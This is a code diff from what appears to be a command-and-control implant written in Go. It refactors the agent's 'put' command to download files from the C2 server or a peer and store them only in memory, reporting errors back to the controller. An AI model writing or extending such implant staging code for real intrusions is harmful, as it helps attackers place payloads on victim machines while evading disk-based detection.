@@ -83,20 +83,13 @@ func putCmdRun(cmd *cobra.Command, args []string) {
 	// Memory storage handling
 	if saveToMem {
 		logging.Printf("putCmdRun: saving %s to memory", fileName)
-		// Download data directly (path="" tells DownloadViaC2 to return []byte)
-		// Note: We bypass c2transport.FetchFile which is disk-centric for now, or we modify FetchFile?
-		// FetchFile uses DownloadViaC2 if addr is empty.
-		// If addr is set (P2P), FetchFileKCP is used.
-		// Let's supporting P2P + Mem later. For now, direct C2 download -> Mem.
-
-		// However, the plan said: "Call c2transport.DownloadViaC2 with path=''"
-		data, err := c2transport.DownloadViaC2(fileName, "", origChecksum)
+		data, err := c2transport.FetchFile(downloadAddr, fileName, "", origChecksum)
 		if err != nil {
 			c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: failed to download to memory %s: %v", fileName, err))
 			return
 		}
 
-		err = util.SaveFileAgent(destPath, data, 0600, util.StorageMemory)
+		err = util.SaveFileAgent(destPath, data, 0o600, util.StorageMemory)
 		if err != nil {
 			c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: failed to save to memory %s: %v", destPath, err))
 			return
@@ -105,6 +98,7 @@ func putCmdRun(cmd *cobra.Command, args []string) {
 		return
 	}
 
+	// Disk storage handling
 	_, err := c2transport.FetchFile(downloadAddr, fileName, destPath, origChecksum)
 	if err != nil {
 		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: failed to download %s: %v", fileName, err))
